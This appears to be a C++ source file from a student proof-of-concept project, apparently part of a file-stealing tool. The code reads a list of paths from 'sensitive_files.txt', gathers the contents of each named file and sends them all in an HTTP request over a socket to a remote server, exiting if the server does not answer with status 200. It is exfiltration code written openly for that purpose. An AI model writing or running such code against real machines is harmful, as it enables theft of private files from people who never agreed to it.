/*
** POC PROJECT, 2022
** send files
** File description:
** send files to server
*/

#include "http_res.hpp"
#include "http_res.hpp"
#include "manage_messages.hpp"
#include <fstream>

std::string get_files(const std::string file_name)
{
    std::ifstream stream(file_name);
    std::string file;
    std::string files;

    if (!stream.is_open()) {
        std::cerr << "Error: list of sensitive file doesn't exist (" << file_name << ")" << std::endl;
    }
    while (stream.good()) {
        std::string line;
        std::getline(stream, file);
        files += get_file(file) + "\n\n";
    }
    return files;
}

void send_file(int socket)
{
    HttpReq req = HttpReq(HttpReq::HttpMethod::GET, "0.0.0.0", "/connect", "HTTP/1.1");

    req << get_files("sensitive_files.txt");
    req.send_message(socket);
    HttpRes res = convert_res(socket);
    if (res.get_status_code() != 200) {
        std::cerr << "Error: " << res.get_status_code() << std::endl;
        exit(84);
    }
}
